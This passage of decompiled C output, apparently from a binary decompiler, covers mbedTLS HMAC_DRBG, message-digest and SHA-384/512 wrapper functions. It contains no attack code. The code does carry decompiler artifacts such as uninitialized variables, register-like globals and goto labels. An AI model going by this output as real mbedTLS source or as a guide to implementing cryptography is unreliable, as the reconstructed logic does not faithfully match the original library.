                    int32_t v14; // 0x8061b6c
                    if (v8 == 0) {
                        // 0x8061af9
                        v14 = g3;
                        // branch -> 0x8061b66
                    } else {
                        // 0x8061afd
                        v10 = g3;
                        v11 = g7;
                        g7 = v8;
                        g3 = v10 + 12;
                        v6 = (int32_t *)v10;
                        v9 = v8;
                        v13 = a2;
                        // branch -> 0x8061b10
                        while (true) {
                            // 0x8061b10
                            g5 = v11;
                            if (v9 <= v11) {
                              lab_if_8061b1c_0_true:
                                // if_8061b1c_0_true
                                g5 = v9;
                                // branch -> after_if_8061b1c_0
                            }
                          lab_after_if_8061b1c_0:
                            // after_if_8061b1c_0
                            mbedtls_md_hmac_reset(v6);
                            mbedtls_md_hmac_update(v6, g3, v11);
                            mbedtls_md_hmac_finish(v6, g3);
                            memcpy((char *)v13, (char *)g3, g5);
                            int32_t v15 = g5; // 0x8061b5c
                            int32_t v16 = g7; // 0x8061b5f
                            int32_t v17 = v16 - v15; // 0x8061b5f
                            g7 = v17;
                            if (v16 == v15) {
                                // break -> 0x8061b63
                                break;
                            }
                            v9 = v17;
                            v13 += v15;
                            // continue -> 0x8061b10
                        }
                        // 0x8061b63
                        g3 = v10;
                        v14 = v10;
                        // branch -> 0x8061b66
                    }
                    // 0x8061b66
                    mbedtls_hmac_drbg_update((int32_t *)v14, (int32_t)a4, v12);
                    v5 = (int32_t *)(g3 + 76);
                    *v5 = *v5 + 1;
                    // branch -> 0x8061a9f
                    // 0x8061a9f
                    g3 = v1;
                    g7 = v2;
                    g5 = v3;
                    return 0;
                }
            }
            // 0x8061ad8
            g6 = (int32_t)a4;
            int32_t result = mbedtls_hmac_drbg_reseed((char *)v4, a4, a5); // 0x8061ae9
            if (result != 0) {
                // 0x8061a9f
                g3 = v1;
                g7 = v2;
                g5 = v3;
                return result;
            }
            v12 = 0;
        }
        // 0x8061af9
        v8 = g5;
        if (v8 == 0) {
            // 0x8061af9
            // branch -> 0x8061b66
        } else {
            // 0x8061afd
            v10 = g3;
            v11 = g7;
            g7 = v8;
            g3 = v10 + 12;
            v6 = (int32_t *)v10;
            v9 = v8;
            v13 = a2;
            // branch -> 0x8061b10
            while (true) {
                // 0x8061b10
                g5 = v11;
                if (v9 > v11) {
                    goto lab_after_if_8061b1c_0;
                }
                goto lab_if_8061b1c_0_true;
            }
        }
        // 0x8061b66
        mbedtls_hmac_drbg_update((int32_t *)g3, (int32_t)a4, v12);
        v5 = (int32_t *)(g3 + 76);
        *v5 = *v5 + 1;
        result2 = 0;
        // branch -> 0x8061a9f
    } else {
        result2 = -5;
    }
    // 0x8061a9f
    g3 = v1;
    g7 = v2;
    g5 = v3;
    return result2;
}

// Address range: 0x8061bc0 - 0x8061bf0
int32_t mbedtls_hmac_drbg_random(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_hmac_drbg_random_with_add((char *)a1, a2, a3, NULL, 0); // 0x8061bea
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x8061da0 - 0x8061e7f
char * mbedtls_hmac_drbg_seed(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g3; // 0x8061da6
    g3 = (int32_t)a1;
    int32_t v2 = g7; // 0x8061dac
    g7 = a2;
    int32_t v3 = g5; // 0x8061db2
    int32_t v4 = mbedtls_md_setup((int32_t *)a1, a2, 1); // 0x8061dc4
    int32_t v5 = v4; // 0x8061dd9_2
    if (v4 == 0) {
        // 0x8061de0
        g5 = g3 + 12;
        int32_t v6 = mbedtls_md_get_size(g7) % 256; // 0x8061df2
        g7 = v6;
        mbedtls_md_hmac_starts((int32_t *)g3, g5, v6);
        int32_t v7 = g5; // 0x8061dfe
        g5 = 16;
        memset((char *)v7, 1, g7);
        *(int32_t *)(g3 + 88) = 0x2710;
        *(int32_t *)(g3 + 92) = a3;
        *(int32_t *)(g3 + 96) = a4;
        int32_t v8 = 24; // 0x8061e34
        if (g7 > 20) {
            uint32_t v9 = g7; // 0x8061e68
            g5 = v9 < 29 ? 24 : 32;
            v8 = v9 < 29 ? 36 : 48;
            // branch -> 0x8061e34
        }
        // 0x8061e34
        *(int32_t *)(g3 + 80) = v8;
        int32_t v10 = mbedtls_hmac_drbg_reseed((char *)g3, (char *)a5, a6); // 0x8061e48
        if (v10 == 0) {
            // 0x8061e55
            *(int32_t *)(g3 + 80) = g5;
            g3 = v1;
            g7 = v2;
            g5 = v3;
            return (char *)v10;
        }
        v5 = v10;
    }
    // 0x8061dcd
    g3 = v1;
    g7 = v2;
    g5 = v3;
    return (char *)v5;
}

// Address range: 0x8061e80 - 0x8061f16
int32_t mbedtls_hmac_drbg_seed_buf(char * a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x8061e86
    g3 = (int32_t)a1;
    int32_t v2 = g5; // 0x8061e8c
    g5 = a2;
    int32_t v3 = g7; // 0x8061e92
    int32_t v4 = mbedtls_md_setup((int32_t *)a1, a2, 1); // 0x8061ea4
    g7 = v4;
    int32_t result = v4; // 0x8061f08
    if (v4 == 0) {
        int32_t v5 = g3; // 0x8061eb7
        int32_t v6 = v5 + 12; // 0x8061eb7
        mbedtls_md_hmac_starts((int32_t *)v5, v6, mbedtls_md_get_size(g5) % 256);
        memset((char *)v6, 1, mbedtls_md_get_size(g5) % 256);
        mbedtls_hmac_drbg_update((int32_t *)g3, a3, a4);
        result = g7;
        // branch -> 0x8061f08
    }
    // 0x8061f08
    g3 = v1;
    g7 = v3;
    g5 = v2;
    return result;
}

// Address range: 0x8061f17 - 0x8061f1f
int32_t function_8061f17(int32_t a1) {
    // 0x8061f17
    return g7;
}

// Address range: 0x8061f20 - 0x8061f3f
int32_t mbedtls_hmac_drbg_init(char * a1) {
    // 0x8061f20
    g6 = (int32_t)a1;
    g4 = (int32_t)memset(a1, 0, 25);
    return 0;
}

// Address range: 0x8061f40 - 0x806219d
int32_t mbedtls_hmac_drbg_self_test(int32_t a1) {
    int32_t v1 = g3; // 0x8061f50
    int32_t v2;
    g3 = &v2;
    int32_t v3 = g5; // 0x8061f59
    int32_t v4 = g7; // 0x8061f5c
    int32_t v5 = mbedtls_md_info_from_type(4); // 0x8061f5f
    mbedtls_hmac_drbg_init((char *)g3);
    g5 = a1;
    if (a1 != 0) {
        // 0x8061fd8
        printf("  HMAC_DRBG (PR = True) : ");
        // branch -> 0x8061f79
    }
    // 0x8061f79
    g1 = v5;
    g218 = 0;
    char * v6 = mbedtls_hmac_drbg_seed((char *)g3, v5, (int32_t)hmac_drbg_self_test_entropy, (int32_t)&g98, 0, 0); // 0x8061fb0
    if (v6 == NULL) {
        // 0x8061fe8
        int32_t str;
        int32_t v7 = &str; // 0x8061fe8_0
        if (mbedtls_hmac_drbg_random(g3, v7, 80) == 0) {
            int32_t v8 = mbedtls_hmac_drbg_random(g3, v7, 80); // 0x8062022
            g1 = v8;
            if (v8 == 0) {
                // 0x806202b
                g7 = v7;
                g5 = (int32_t)&g99;
                uint32_t strncmp_rc = strncmp((char *)&str, (char *)&g99, 80);
                g4 = strncmp_rc;
                g237 = strncmp_rc % 2 == 0;
                if (strncmp_rc % 2 == 0) {
                    // 0x8062043
                    g1 = mbedtls_hmac_drbg_free((char *)g3);
                    mbedtls_hmac_drbg_free((char *)g3);
                    g7 = a1;
                    if (a1 != 0) {
                        // 0x8062186
                        puts("passed");
                        int32_t chars_printed = printf("  HMAC_DRBG (PR = False) : ");
                        g1 = chars_printed;
                        return chars_printed;
                    }
                    // 0x806205e
                    mbedtls_hmac_drbg_init((char *)g3);
                    g1 = v5;
                    g218 = 0;
                    char * v9 = mbedtls_hmac_drbg_seed((char *)g3, v5, (int32_t)hmac_drbg_self_test_entropy, (int32_t)&g100, 0, 0); // 0x806209d
                    if (v9 == NULL) {
                        // 0x80620aa
                        if (mbedtls_hmac_drbg_reseed((char *)g3, NULL, 0) == 0) {
                            // 0x80620ca
                            if (mbedtls_hmac_drbg_random(g3, v7, 80) == 0) {
                                // 0x80620e9
                                if (mbedtls_hmac_drbg_random(g3, v7, 80) == 0) {
                                    int32_t memcmp_rc = memcmp((char *)&str, (char *)&g101, 80); // 0x806211e
                                    g1 = memcmp_rc;
                                    if (memcmp_rc == 0) {
                                        // 0x806212b
                                        g1 = mbedtls_hmac_drbg_free((char *)g3);
                                        mbedtls_hmac_drbg_free((char *)g3);
                                        g1 = 0;
                                        if (a1 != 0) {
                                            // 0x8062147
                                            puts("passed");
                                            putchar(10);
                                            g1 = 0;
                                            // branch -> 0x8061fc9
                                        }
                                        // 0x8061fc9
                                        g3 = v1;
                                        g7 = v4;
                                        g5 = v3;
                                        return 0;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    // 0x8061fb9
    g1 = 1;
    if (a1 == 0) {
        // 0x8061fc9
        g3 = v1;
        g7 = v4;
        g5 = v3;
        return 1;
    }
    // 0x8062168
    puts("failed");
    g3 = v1;
    g1 = 1;
    g7 = v4;
    g5 = v3;
    return 1;
}

// Address range: 0x80621b0 - 0x80621bf
int32_t mbedtls_md_list(void) {
    // 0x80621b0
    g1 = &g102;
    int32_t v1;
    g2 = v1;
    return &g102;
}

// Address range: 0x80621c0 - 0x80621df
int32_t mbedtls_md_info_from_type(int32_t a1) {
    // 0x80621c0
    g1 = 0;
    int32_t v1 = a1 - 3; // 0x80621c8
    g6 = v1;
    int32_t result; // 0x80621d0
    if (v1 <= 6) {
        // 0x80621d0
        result = *(int32_t *)(4 * v1 + (int32_t)&g103);
        g1 = result;
        // branch -> 0x80621d7
    } else {
        result = 0;
    }
    // 0x80621d7
    int32_t v2;
    g2 = v2;
    return result;
}

// Address range: 0x8062230 - 0x806225f
int32_t mbedtls_md_starts(int32_t * a1) {
    int32_t v1;
    g2 = &v1;
    if (a1 == NULL) {
        // 0x806223d
        return -0x5100;
    }
    int32_t v2 = *a1; // 0x8062248
    g6 = v2;
    g237 = v2 == 0;
    if (v2 == 0) {
        // 0x806223d
        return -0x5100;
    }
    int32_t v3 = *(int32_t *)((int32_t)a1 + 4); // 0x806224e
    g1 = v3;
    ((int32_t (*)(int32_t))*(int32_t *)(v2 + 16))(v3);
    return 0;
}

// Address range: 0x8062260 - 0x806229f
int32_t mbedtls_md_update(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1;
    g2 = &v1;
    if (a1 == NULL) {
        // 0x806226d
        return -0x5100;
    }
    int32_t v2 = *a1; // 0x8062278
    g6 = v2;
    g237 = v2 == 0;
    if (v2 == 0) {
        // 0x806226d
        return -0x5100;
    }
    // 0x806227e
    g4 = a2;
    int32_t v3 = *(int32_t *)((int32_t)a1 + 4); // 0x806228c
    g1 = v3;
    ((int32_t (*)(int32_t, int32_t, int32_t))*(int32_t *)(v2 + 20))(v3, a2, a3);
    return 0;
}

// Address range: 0x80622a0 - 0x80622df
int32_t mbedtls_md_finish(int32_t * a1, int32_t a2) {
    int32_t v1;
    g2 = &v1;
    if (a1 == NULL) {
        // 0x80622ad
        return -0x5100;
    }
    int32_t v2 = *a1; // 0x80622b8
    g6 = v2;
    g237 = v2 == 0;
    if (v2 == 0) {
        // 0x80622ad
        return -0x5100;
    }
    // 0x80622be
    g4 = a2;
    int32_t v3 = *(int32_t *)((int32_t)a1 + 4); // 0x80622c5
    g1 = v3;
    ((int32_t (*)(int32_t, int32_t))*(int32_t *)(v2 + 24))(v3, a2);
    return 0;
}

// Address range: 0x80622e0 - 0x806230c
int32_t mbedtls_md(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x80622e0
    int32_t v1;
    int32_t v2 = v1; // bp-4
    g1 = -0x5100;
    g2 = &v2;
    g6 = a1;
    g237 = a1 == 0;
    int32_t result; // 0x806230c_2
    if (a1 != 0) {
        // 0x80622f2
        g1 = a2;
        ((int32_t (*)(int32_t, int32_t, int32_t))*(int32_t *)(a1 + 28))(a2, a3, a4);
        g1 = 0;
        result = 0;
        // branch -> 0x806230b
    } else {
        v2 = v1;
        result = -0x5100;
    }
    // 0x806230b
    g2 = v2;
    return result;
}

// Address range: 0x806230d - 0x806230f
int32_t function_806230d(int32_t a1) {
    // 0x806230d
    return g7;
}

// Address range: 0x8062310 - 0x806234f
int32_t mbedtls_md_hmac_update(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    g2 = &v2;
    if (a1 == NULL) {
        // 0x806231d
        return -0x5100;
    }
    int32_t v3 = *a1; // 0x8062328
    g6 = v3;
    if (v3 == 0) {
        // 0x806231d
        return -0x5100;
    }
    int32_t v4 = *(int32_t *)(v1 + 8); // 0x806232e
    g4 = v4;
    g237 = v4 == 0;
    if (v4 == 0) {
        // 0x806231d
        return -0x5100;
    }
    // 0x8062335
    g4 = a2;
    int32_t v5 = *(int32_t *)(v1 + 4); // 0x8062343
    g1 = v5;
    ((int32_t (*)(int32_t, int32_t, int32_t))*(int32_t *)(v3 + 20))(v5, a2, a3);
    return 0;
}

// Address range: 0x8062350 - 0x80623ef
int32_t mbedtls_md_hmac_finish(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    g2 = &v2;
    int32_t v3 = g3; // 0x8062356
    g3 = v1;
    int32_t v4 = g7; // 0x806235c
    int32_t v5 = g5; // 0x806235f
    if (a1 == NULL) {
        // 0x806236b
        g3 = v3;
        g7 = v4;
        g5 = v5;
        return -0x5100;
    }
    int32_t v6 = *a1; // 0x8062378
    g1 = v6;
    if (v6 == 0) {
        // 0x806236b
        g3 = v3;
        g7 = v4;
        g5 = v5;
        return -0x5100;
    }
    int32_t v7 = *(int32_t *)(v1 + 8); // 0x806237e
    g6 = v7;
    int32_t result;
    if (v7 != 0) {
        // 0x8062385
        int32_t v8;
        int32_t v9 = &v8; // 0x8062388_0
        g7 = v9;
        int32_t v10 = *(int32_t *)(v6 + 12) + v7; // 0x806238f
        g237 = v10 == 0;
        g5 = v10;
        int32_t v11 = *(int32_t *)(v1 + 4); // 0x8062391
        g6 = v11;
        ((int32_t (*)(int32_t, int32_t))*(int32_t *)(v6 + 24))(v11, v9);
        int32_t v12 = g3; // 0x806239a
        int32_t v13 = *(int32_t *)v12; // 0x806239a
        g1 = v13;
        int32_t v14 = *(int32_t *)(v12 + 4); // 0x806239c
        g6 = v14;
        ((int32_t (*)(int32_t))*(int32_t *)(v13 + 16))(v14);
        int32_t v15 = g3; // 0x80623a5
        int32_t v16 = *(int32_t *)v15; // 0x80623a5
        g1 = v16;
        int32_t v17 = *(int32_t *)(v15 + 4); // 0x80623b2
        g6 = v17;
        int32_t v18 = *(int32_t *)(v16 + 20); // 0x80623b8
        ((int32_t (*)(int32_t, int32_t, int32_t))v18)(v17, v10, *(int32_t *)(v16 + 12));
        int32_t v19 = g3; // 0x80623bb
        int32_t v20 = *(int32_t *)v19; // 0x80623bb
        g1 = v20;
        int32_t v21 = *(int32_t *)(v19 + 4); // 0x80623c8
        g6 = v21;
        int32_t v22 = *(int32_t *)(v20 + 20); // 0x80623ce
        ((int32_t (*)(int32_t, int32_t, int32_t))v22)(v21, g7, *(int32_t *)(v20 + 8));
        int32_t v23 = g3; // 0x80623d4
        int32_t v24 = *(int32_t *)v23; // 0x80623d4
        g1 = v24;
        int32_t v25 = *(int32_t *)(v23 + 4); // 0x80623da
        g6 = v25;
        ((int32_t (*)(int32_t, int32_t))*(int32_t *)(v24 + 24))(v25, a2);
        result = 0;
        // branch -> 0x806236b
    } else {
        result = -0x5100;
    }
    // 0x806236b
    g3 = v3;
    g7 = v4;
    g5 = v5;
    return result;
}

// Address range: 0x80623f0 - 0x806244f
int32_t mbedtls_md_hmac_reset(int32_t * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    g2 = &v2;
    int32_t v3 = g3; // 0x80623f6
    g3 = v1;
    int32_t v4 = g7; // 0x80623fc
    if (a1 == NULL) {
        // 0x8062408
        g3 = v3;
        g7 = v4;
        return -0x5100;
    }
    int32_t v5 = *a1; // 0x8062418
    g1 = v5;
    if (v5 == 0) {
        // 0x8062408
        g3 = v3;
        g7 = v4;
        return -0x5100;
    }
    int32_t v6 = *(int32_t *)(v1 + 8); // 0x806241e
    g7 = v6;
    g237 = v6 == 0;
    int32_t result;
    if (v6 != 0) {
        int32_t v7 = *(int32_t *)(v1 + 4); // 0x8062425
        g6 = v7;
        ((int32_t (*)(int32_t))*(int32_t *)(v5 + 16))(v7);
        int32_t v8 = g3; // 0x806242e
        int32_t v9 = *(int32_t *)v8; // 0x806242e
        g1 = v9;
        int32_t v10 = *(int32_t *)(v8 + 4); // 0x806243b
        g6 = v10;
        int32_t v11 = *(int32_t *)(v9 + 20); // 0x8062441
        ((int32_t (*)(int32_t, int32_t, int32_t))v11)(v10, g7, *(int32_t *)(v9 + 12));
        result = 0;
        // branch -> 0x8062408
    } else {
        result = -0x5100;
    }
    // 0x8062408
    g3 = v3;
    g7 = v4;
    return result;
}

// Address range: 0x8062490 - 0x80624af
int32_t mbedtls_md_get_size(int32_t a1) {
    // 0x8062490
    g1 = 0;
    g6 = a1;
    int32_t result; // 0x806249c
    if (a1 != 0) {
        // 0x806249c
        result = (int32_t)*(char *)(a1 + 8);
        g1 = result;
        // branch -> 0x80624a0
    } else {
        result = 0;
    }
    // 0x80624a0
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x80624c0 - 0x80624d0
int32_t mbedtls_md_get_name(int32_t a1) {
    // 0x80624c0
    g1 = 0;
    int32_t result; // 0x80624cc
    if (a1 != 0) {
        // 0x80624cc
        result = *(int32_t *)(a1 + 4);
        g1 = result;
        // branch -> 0x80624cf
    } else {
        result = 0;
    }
    // 0x80624cf
    return result;
}

// Address range: 0x80624d1 - 0x80624df
int32_t function_80624d1(void) {
    int32_t result = mbedtls_md_hmac_starts(NULL, 0, 0); // 0x80624d1
    g1 = result;
    return result;
}

// Address range: 0x80624e0 - 0x806261f
int32_t mbedtls_md_hmac_starts(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2 = v1; // bp-4
    int32_t v3 = (int32_t)a1;
    g2 = &v2;
    int32_t v4 = g3; // 0x80624e6
    g3 = v3;
    int32_t v5 = g7; // 0x80624ec
    g4 = a3;
    int32_t v6 = g5; // 0x80624f2
    g7 = a2;
    if (a1 == NULL) {
        // 0x8062501
        g3 = v4;
        g7 = v5;
        g5 = v6;
        g2 = v1;
        return -0x5100;
    }
    int32_t v7 = *a1; // 0x8062510
    g6 = v7;
    if (v7 == 0) {
        // 0x8062501
        g3 = v4;
        g7 = v5;
        g5 = v6;
        g2 = v1;
        return -0x5100;
    }
    int32_t v8 = *(int32_t *)(v3 + 8); // 0x8062516
    g5 = v8;
    if (v8 == 0) {
        // 0x8062501
        g3 = v4;
        g7 = v5;
        g5 = v6;
        g2 = v1;
        return -0x5100;
    }
    uint32_t v9 = *(int32_t *)(v7 + 12); // 0x806251d
    g237 = v9 == a3;
    int32_t v10 = a3; // 0x8062570
    int32_t v11 = v9; // 0x8062528
    int32_t v12;
    if (v9 < a3) {
        int32_t v13 = *(int32_t *)(v3 + 4); // 0x80625ca
        g1 = v13;
        ((int32_t (*)(int32_t))*(int32_t *)(v7 + 16))(v13);
        g4 = a3;
        int32_t v14 = g3; // 0x80625d9
        int32_t v15 = *(int32_t *)v14; // 0x80625d9
        g1 = v15;
        int32_t v16 = g7; // 0x80625db
        int32_t v17 = &v12; // 0x80625df_0
        g7 = v17;
        int32_t v18 = *(int32_t *)(v14 + 4); // 0x80625e6
        g6 = v18;
        ((int32_t (*)(int32_t, int32_t, int32_t))*(int32_t *)(v15 + 20))(v18, v16, a3);
        int32_t v19 = g3; // 0x80625f2
        int32_t v20 = *(int32_t *)v19; // 0x80625f2
        g1 = v20;
        int32_t v21 = *(int32_t *)(v19 + 4); // 0x80625f8
        g6 = v21;
        ((int32_t (*)(int32_t, int32_t))*(int32_t *)(v20 + 24))(v21, v17);
        int32_t v22 = g3; // 0x8062601
        int32_t v23 = *(int32_t *)v22; // 0x8062601
        int32_t v24 = *(int32_t *)(v22 + 8); // 0x8062603
        g5 = v24;
        v10 = *(int32_t *)(v23 + 8);
        v11 = *(int32_t *)(v23 + 12);
        v8 = v24;
        // branch -> 0x8062528
    }
    int32_t v25 = v8 + v11; // 0x8062528
    memset((char *)v8, 54, v11);
    memset((char *)v25, 92, *(int32_t *)(*(int32_t *)g3 + 12));
    g4 = v10;
    if (v10 != 0) {
        int32_t v26 = 0; // eax
        int32_t v27 = 0; // 0x806257c
        unsigned char v28 = *(char *)(g7 + v27); // 0x8062578
        char * v29 = (char *)(g5 + v27); // 0x806257c_0
        *v29 = (char)((int32_t)*v29 ^ (int32_t)v28);
        int32_t v30 = v26; // 0x806257f
        unsigned char v31 = *(char *)(v30 + g7); // 0x806257f
        g4 = v31;
        char * v32 = (char *)(v25 + v30); // 0x8062583_0
        *v32 = *v32 ^ v31;
        int32_t v33 = v26 + 1; // 0x8062586
        v26 = v33;
        // branch -> 0x8062578
        while (v10 > v33) {
            // 0x8062578
            v27 = v33;
            v28 = *(char *)(g7 + v27);
            v29 = (char *)(g5 + v27);
            *v29 = (char)((int32_t)*v29 ^ (int32_t)v28);
            v30 = v26;
            v31 = *(char *)(v30 + g7);
            g4 = v31;
            v32 = (char *)(v25 + v30);
            *v32 = *v32 ^ v31;
            v33 = v26 + 1;
            v26 = v33;
            // continue -> 0x8062578
        }
        // 0x806258d
        // branch -> 0x8062590
    }
    int32_t v34 = &v12; // 0x8062590_0
    int32_t v35;
    int32_t v36 = &v35; // edx
    *(char *)v34 = 0;
    int32_t v37 = v34 + 1; // 0x806259b
    g237 = v37 == v36;
    // branch -> 0x8062598
    while (v37 != v36) {
        // 0x8062598
        *(char *)v37 = 0;
        v37++;
        g237 = v37 == v36;
        // continue -> 0x8062598
    }
    int32_t v38 = g3; // 0x80625a2
    int32_t v39 = *(int32_t *)v38; // 0x80625a2
    g1 = v39;
    int32_t v40 = *(int32_t *)(v38 + 4); // 0x80625a4
    g6 = v40;
    ((int32_t (*)(int32_t))*(int32_t *)(v39 + 16))(v40);
    int32_t v41 = g3; // 0x80625ad
    int32_t v42 = *(int32_t *)v41; // 0x80625ad
    g1 = v42;
    int32_t v43 = *(int32_t *)(v41 + 4); // 0x80625ba
    g6 = v43;
    int32_t v44 = *(int32_t *)(v42 + 20); // 0x80625c0
    ((int32_t (*)(int32_t, int32_t, int32_t))v44)(v43, g5, *(int32_t *)(v42 + 12));
    // branch -> 0x8062501
    // 0x8062501
    g3 = v4;
    g7 = v5;
    g5 = v6;
    g2 = v2;
    return 0;
}

// Address range: 0x8062620 - 0x806263f
int32_t mbedtls_md_init(int32_t * a1) {
    int32_t result = (int32_t)a1;
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    return result;
}

// Address range: 0x8062640 - 0x80626bf
int32_t mbedtls_md_setup(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x8062646
    g3 = a2;
    int32_t v3 = g7; // 0x806264c
    g7 = (int32_t)a1;
    if (a2 == 0) {
        // 0x8062656
        // branch -> 0x806265b
        // 0x806265b
        g3 = v2;
        g7 = v3;
        return -0x5100;
    }
    // 0x8062668
    g237 = a1 == NULL;
    if (a1 == NULL) {
        // 0x8062656
        // branch -> 0x806265b
        // 0x806265b
        g3 = v2;
        g7 = v3;
        return -0x5100;
    }
    // 0x806266c
    ((int32_t (*)())*(int32_t *)(a2 + 32))();
    int32_t v4 = g1; // 0x806266f
    g6 = v4;
    *(int32_t *)(g7 + 4) = v4;
    if (v4 == 0) {
        // 0x806265b
        g3 = v2;
        g7 = v3;
        return -0x5180;
    }
    // 0x806267d
    if (a3 != 0) {
        char * mem = calloc(2, *(int32_t *)(g3 + 12)); // 0x8062698
        g237 = mem == NULL;
        *(int32_t *)(g7 + 8) = (int32_t)mem;
        if (mem == NULL) {
            int32_t v5 = *(int32_t *)(g7 + 4); // 0x80626a4
            g1 = v5;
            ((int32_t (*)(int32_t))*(int32_t *)(g3 + 36))(v5);
            // branch -> 0x806265b
            // 0x806265b
            g3 = v2;
            g7 = v3;
            return -0x5180;
        }
    }
    // 0x8062684
    *(int32_t *)g7 = g3;
    // branch -> 0x806265b
    // 0x806265b
    g3 = v2;
    g7 = v3;
    return 0;
}

// Address range: 0x80626c0 - 0x80626ef
int32_t mbedtls_md_init_ctx(int32_t a1, int32_t a2) {
    // 0x80626c0
    g1 = a1;
    return mbedtls_md_setup((int32_t *)a1, a2, 1);
}

// Address range: 0x80626f0 - 0x806275f
int32_t mbedtls_md_free(char * a1) {
    // 0x80626f0
    int32_t v1;
    int32_t v2 = v1; // bp-4
    g2 = &v2;
    int32_t v3 = g3; // 0x80626f3
    int32_t v4 = (int32_t)a1;
    g3 = v4;
    if (a1 == NULL) {
        // 0x80626f0
        // branch -> 0x8062752
        // 0x8062752
        g3 = v3;
        g2 = v1;
        return g1;
    }
    int32_t v5 = *(int32_t *)a1; // 0x80626fe
    g1 = v5;
    int32_t result; // 0x8062757_2
    if (v5 != 0) {
        int32_t v6 = *(int32_t *)(v4 + 4); // 0x8062704
        g6 = v6;
        g237 = v6 == 0;
        if (v6 != 0) {
            // 0x806270b
            ((int32_t (*)(int32_t))*(int32_t *)(v5 + 36))(v6);
            v4 = g3;
            // branch -> 0x8062711
        }
        int32_t v7 = *(int32_t *)(v4 + 8); // 0x8062711
        g4 = v7;
        int32_t v8 = v4; // 0x806273e
        if (v7 != 0) {
            int32_t v9 = 2 * *(int32_t *)(*(int32_t *)v4 + 12); // 0x806271d
            if (v9 != 0) {
                *(char *)v7 = 0;
                int32_t v10 = g4 + 1; // 0x806272b
                g4 = v10;
                int32_t v11 = v9 - 1; // 0x806272e
                while (v11 != 0) {
                    // 0x8062728
                    *(char *)v10 = 0;
                    v10 = g4 + 1;
                    g4 = v10;
                    v11--;
                    // continue -> 0x8062728
                }
                int32_t v12 = *(int32_t *)(g3 + 8); // 0x8062733
                g4 = v12;
                v7 = v12;
                // branch -> 0x8062736
            }
            // 0x8062736
            free((char *)v7);
            v8 = g3;
            // branch -> 0x806273e
        }
        // 0x806273e
        *(char *)v8 = 0;
        int32_t v13 = v8 + 1; // 0x806274b
        // branch -> 0x8062748
        while (v13 != v8 + 12) {
            // 0x8062748
            *(char *)v13 = 0;
            v13++;
            // continue -> 0x8062748
        }
        // 0x8062752
        result = v13;
        // branch -> 0x8062752
    } else {
        result = 0;
        v2 = v1;
    }
    // 0x8062752
    g3 = v3;
    g2 = v2;
    return result;
}

// Address range: 0x8062760 - 0x806280f
int32_t mbedtls_md_hmac(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x8062766
    g5 = a1;
    int32_t v2 = g7; // 0x806276c
    g7 = -0x5100;
    int32_t v3 = g3; // 0x8062774
    int32_t v4;
    int32_t result; // 0x80627a0
    if (a1 == 0) {
        result = -0x5100;
        // 0x80627a0
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v4;
        return result;
    }
    // 0x806277b
    int32_t v5;
    g3 = &v5;
    g1 = mbedtls_md_init(&v5);
    int32_t v6 = mbedtls_md_setup((int32_t *)g3, g5, 1); // 0x8062795
    g7 = v6;
    if (v6 != 0) {
        // 0x806277b
        result = v6;
        // branch -> 0x80627a0
        // 0x80627a0
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v4;
        return result;
    }
    // 0x80627b0
    mbedtls_md_hmac_starts((int32_t *)g3, a2, a3);
    mbedtls_md_hmac_update((int32_t *)g3, a4, a5);
    g1 = mbedtls_md_hmac_finish((int32_t *)g3, a6);
    mbedtls_md_free((char *)g3);
    int32_t result2 = g7; // 0x80627f3
    g1 = result2;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v4;
    return result2;
}

// Address range: 0x8062a60 - 0x8062a8f
int32_t sha512_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_sha512(a1, a2, a3, 0); // 0x8062a82
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x8062a90 - 0x8062abf
int32_t sha384_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_sha512(a1, a2, a3, 1); // 0x8062ab2
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x8062ac0 - 0x8062adf
int32_t sha512_starts_wrap(int32_t a1) {
    int32_t result = mbedtls_sha512_starts((int32_t *)a1, 0); // 0x8062ad4
    g1 = result;
    return result;
}

// Address range: 0x8062ae0 - 0x8062aff
int32_t sha384_starts_wrap(int32_t a1) {
    int32_t result = mbedtls_sha512_starts((int32_t *)a1, 1); // 0x8062af4
    g1 = result;
    return result;
}

// Address range: 0x8062b00 - 0x8062b0f
int32_t sha384_process_wrap(int32_t a1) {
    // 0x8062b00
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_sha512_process(v2, v1); // 0x8062b07
    g1 = result;
    return result;
}

// Address range: 0x8062b10 - 0x8062b1f
int32_t sha384_clone_wrap(int32_t a1) {
    // 0x8062b10
    int32_t v1;
    int32_t result;
    mbedtls_sha512_clone((char *)result, (char *)v1);
    return result;
}

// Address range: 0x8062b20 - 0x8062b3f
int32_t sha384_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x8062b20
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    mbedtls_sha512_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x8062b90 - 0x8062b9f
